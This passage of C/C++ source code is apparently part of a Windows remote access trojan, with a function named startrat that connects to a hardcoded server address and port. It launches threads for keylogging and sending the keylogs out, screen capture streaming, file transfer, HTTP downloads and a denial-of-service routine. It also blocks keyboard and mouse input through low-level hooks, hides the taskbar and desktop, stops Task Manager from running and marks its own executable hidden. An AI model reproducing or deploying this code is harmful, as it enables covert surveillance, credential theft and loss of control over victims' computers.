				tcp->Send("\xFF\xFF\xFA\xFC\xFC\xFC\xBD\xBA\xBD", 9);
				Sleep(10);
				END_ENCODING();
				tcp->CloseConnection();
				delete tcp;
				tcp = 0;

				streamcfg.fps = 0;
				streamcfg.width = 0;
				streamcfg.height = 0;
				
				printf("END SCREENSHARE !\n");

			}
			Sleep(1000);
			continue;
		}

		
		if (!tcp)
		{
			tcp = new leynet_tcp;
			if (tcp->OpenConnection(serveraddress, screenshareport))
			{
				streamcfg.fps = 0;
				printf("END SCREENSHARE __ NO CONNECTION!\n");
				continue;
			}
		}

		SYSTEMTIME curtime;
		GetSystemTime(&curtime);

		unsigned int diff = abs(curtime.wMilliseconds - lasttime.wMilliseconds);
	

		if (diff>=((unsigned int)1000/streamcfg.fps))
		{
			printf("CAPTURE\n");

			capturescreen(tcp);
			GetSystemTime(&lasttime);
		}
		else
		{
			Sleep((1000 / streamcfg.fps) - diff);
			continue;
		}

		continue;
		curframes++;

		if (curframes > streamcfg.fps)
		{
			curframes = 0;

//			if (streamcfg.waittime)
			//	Sleep(streamcfg.waittime);

		}

	}

	return 0;
}

HHOOK HookKbd = NULL; //keyboard hook handle
HHOOK HookMouse = NULL; //mouse hook handle

LRESULT CALLBACK KbdHook(int nCode, WPARAM wp, LPARAM lp)
{
	printf("H1\n");

	return 1;
}

LRESULT CALLBACK MouseHook(int nCode, WPARAM wp, LPARAM lp)
{
	printf("H2\n");

	return 1;
}

int installhook(int type)
{

	if (type == 1)
	{
		printf("HOOK KBD");

		HookKbd = SetWindowsHookExA(WH_KEYBOARD_LL, KbdHook, GetModuleHandle(0), 0);

		if (!HookKbd)
		{
			printf("Couldn't hook kbd!");
			return 0;
		}

	}

	if (type == 2)
	{
		printf("HOOK MOUSE");

		HookMouse = SetWindowsHookExA(WH_MOUSE_LL, MouseHook, GetModuleHandle(0), 0);

		if (!HookMouse)
		{
			printf("Couldn't hook mouse!");
			return 0;
		}


	}

	return 0;
}

int uninstallhook(int type)
{
	if (type == 1)
	{
		printf("UNHOOK KBD");

		UnhookWindowsHookEx(HookKbd);
		HookKbd = 0;
	}

	if (type == 2)
	{
		printf("UNHOOK MOUSE");

		UnhookWindowsHookEx(HookMouse);
		HookMouse = 0;
	}

	return 0;

}

int suppresskeythread()
{
	bool prev_hookmouse = false;
	bool prev_hookbd = false;

	while (1)
	{
		
		if (prev_hookbd != keyboardblock)
		{
			prev_hookbd = keyboardblock;

			if (keyboardblock)
				installhook(1);
			else
				uninstallhook(1);

		}

		if (prev_hookmouse != mouseblock)
		{
			prev_hookmouse = mouseblock;

			if (mouseblock)
				installhook(2);
			else
				uninstallhook(2);
		}


		if (keyboardblock || mouseblock)
		{
			MSG msg;

			while (PeekMessage(&msg, NULL, 0, 0, 1) > 0)
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);

			}
		}

		Sleep(1);

	}

	return 0;
}


LRESULT CALLBACK WndProc(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg > 1000 && hide_taskmgr)
	{
		//printf("%lu\n", msg);
		return msg;
	}

	return DefWindowProc(window, msg, wParam, lParam);
}


int hidewindowsthread()
{

	WNDCLASSEX wcex = { 0 };
	wcex.cbSize = sizeof(wcex);
	wcex.lpfnWndProc = WndProc;
	wcex.hInstance = GetModuleHandleA(0);
	wcex.lpszClassName = "TaskManagerWindow";

	if (!RegisterClassEx(&wcex))
	{
		printf("rip window class: %i\n", GetLastError());
		return 1;
	}


	char *shit[] = { "Task-Manager", "Task Manager", "Windows Task Manager" };

	for (int i = 0; i < 2; i++)
	{
		HWND hWnd = CreateWindow("TaskManagerWindow", shit[i], WS_OVERLAPPEDWINDOW, 1, 1, 10, 10, 0, 0, GetModuleHandleA(0), 0);


		if (!hWnd)
		{
			printf("rip window: %i\n", GetLastError());
			return 1;
		}

		LONG lStyle = GetWindowLong(hWnd, GWL_STYLE) & ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZE | WS_MAXIMIZE | WS_SYSMENU);


		SetWindowLong(hWnd, GWL_STYLE, lStyle);
		SetWindowPos(hWnd, NULL, 0, 0, 0, 0, SWP_FRAMECHANGED | SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_NOOWNERZORDER);
		ShowWindow(hWnd, SW_HIDE);
		UpdateWindow(hWnd);

	}

	HANDLE mutex1 = 0;
	HANDLE mutex2 = 0;
	HANDLE mutex3 = 0;

	MSG msg;

	while (1)
	{

		if (PeekMessage(&msg, NULL, 0, 0, 1))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		HWND taskbar = FindWindow("Shell_TrayWnd", 0);
		HWND taskmgr = FindWindow(0, "Windows Task Manager");
		HWND desktop = FindWindow("Progman", 0);

		if (taskbar)
		{
			if (hide_taskbar)
			{
				ShowWindow(taskbar, SW_HIDE);
			}
			else {
				ShowWindow(taskbar, SW_SHOW);
			}
		}
		
		if (desktop)
		{
			if (hide_desktop)
			{
				ShowWindow(desktop, SW_HIDE);
				EnableWindow(desktop, false);
			}
			else {
				ShowWindow(desktop, SW_SHOW);
				EnableWindow(desktop, true);
			}
		}


		if (hide_taskmgr)
		{

			if (taskmgr)
			{
				PostMessage(taskmgr, WM_QUIT, (WPARAM)0, (LPARAM)0);
			}

			if (!mutex1)
			{
				mutex1 = CreateMutex(0, true, "TM.750ce7b0-e5fd-454f-9fad-2f66513dfa1b");
			}
		}
		else {
			if (mutex1)
				ReleaseMutex(mutex1);

			if (mutex2)
				ReleaseMutex(mutex2);

			if (mutex3)
				ReleaseMutex(mutex3);

		}


		Sleep(100);
	}
}


int hide()
{

	TCHAR szFile[MAX_PATH], szCmd[MAX_PATH + 20];
	GetModuleFileName(NULL, szFile, MAX_PATH);

	sprintf(szCmd, "cmd /c attrib +h %s >> NUL", szFile);

	WinExec(szCmd, SW_SHOW);

	return 0;
}

int recvfromthread()
{
	while (true)
	{
		recvfromthink();
	}
}


int startrat()
{

	net.Start();
	Sleep(2000);


	while (1)
	{
		if (!net.OpenSocket(serverport))
			break;

		Sleep(5000);
	}

	strcpy(serveraddress, "37.4.8.57");
	serverport = 27065;

	//hide();


	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ackserverthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)dosthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)httpdownloadthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)tcpfilethread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)keylogthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)keylogsendthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)screensharethread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)suppresskeythread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)hidewindowsthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recvfromthread, 0, 0, 0);

	TerminateThread(GetCurrentThread(), 0);

	return 0;
}

int main(int argc, char** argv)
{
	//keybd_event(VK_RETURN, (char)VK_RETURN, 0x0, 0x0);
	//keybd_event(VK_RETURN, (char)VK_RETURN, KEYEVENTF_KEYUP, 0x0);

	startrat();

	return 0;
}
int newmain()
{
	mainCRTStartup();
	return 0;
}
